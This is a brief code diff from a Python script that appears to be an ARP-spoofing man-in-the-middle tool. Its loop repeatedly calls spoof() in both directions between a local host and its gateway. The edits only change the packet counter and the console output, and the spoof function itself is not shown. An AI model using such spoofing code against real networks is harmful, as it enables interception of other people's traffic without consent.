@@ -28,9 +28,9 @@ def spoof(targetip,sourceip):
 
 packets = 0
 while True:
-    packets = packets+1
+    packets = packets+2
     spoof("192.168.31.19", "192.168.31.1")
     spoof("192.168.31.1", "192.168.31.19")
-    print("[+] Packets sent: " + str(packets))
+    print("\r[+] Packets sent: " + str(packets), end="")
     time.sleep(2)
 
